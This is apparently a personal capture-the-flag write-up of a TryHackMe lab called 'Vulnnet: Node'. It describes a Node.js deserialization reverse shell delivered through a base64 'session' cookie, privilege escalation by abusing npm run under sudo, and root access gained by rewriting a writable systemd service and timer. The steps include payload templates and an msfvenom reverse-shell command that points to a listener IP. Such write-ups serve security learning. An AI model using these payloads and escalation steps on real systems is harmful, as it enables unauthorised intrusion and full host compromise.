# Vulnnet: Node

https://tryhackme.com/room/vulnnetnode

An interesting room, that I found pretty straight forward. However I had a bit of trouble with the final privesc. Still not entirely sure why - need to learn more about systemctl I guess.

1. Rustscan showed only port 8080. On there, enumerating about, I found a nodejs website with nothing obvious aside from a 'session' cookie.
2. The 'session' cookie was base64, decoding it revealed a basic structure with the username, which I could manipulate. I thought this might be template injection, but couldn't find a payload that worked.
3. Instead, I searched nodejs deserialization exploits, and found this: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/. Using https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py I created a reverse shell payload and embedded it in `{"rce":"_$$ND_FUNC$$_function (){<reverse-shell-code-here>}()"}` before base64 encoding the result, opening a listener on my attack box, and submitting the new cookie I got a reverse-shell as `www-data`.
4. `sudo -l` revealed www-data could run `/usr/bin/npm` as the user `serv-manage`. Using the gtfo-bins entry, I created a package.json in /tmp via `echo '{"scripts": {"preinstall": "/bin/sh"}}' > /tmp/package.json`. I then switched to the serv-manage user via `sudo -u serv-manage /usr/bin/npm -C /tmp i`. The **user.txt** flag was in serv-manage's home directory.
5. `sudo -l` revealed that serv-manage could restart a systemd timer, and initiate a daemon reload. Both the timer and the service it invoked were writable.

I struggled a bit at this point. What I tried was creating a script in `/tmp/script.sh` that would copy bash and set the suid bit, and then modified the service to invoke this script. However this failed, and I am not sure why. Ultimately, I narrowed it down to something about invoking a script (even `touch test` failed, so it wasnt the command). When I switched to asking it to run `/bin/date` it worked, so I needed a binary not a script.

For overwriting the service and timer, given I was several shells deep, I found the best approach was to use cyberchef to edit the content then base64 encode the result. To overwrite the timer, I would do `echo <base64> | base64 -d > /etc/systemd/system/vulnnet-service.timer` for example.

6. To create a payload, I used msfvenom: `msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.222.217 lport=4445 -f elf > connect`, and then used a python webserver to get this onto the compromised server before making it executable with `chmod +x`
7. I altered the service file to invoke `/tmp/connect`, then modified the timer file to run every minute instead of every 30.
8. Finally I used the sudo commands to reload the daemon and stop/start the timer, then waited with a reverse shell listener.

Soon enough it connected and I had a root shell, with the final flag under `/root`.
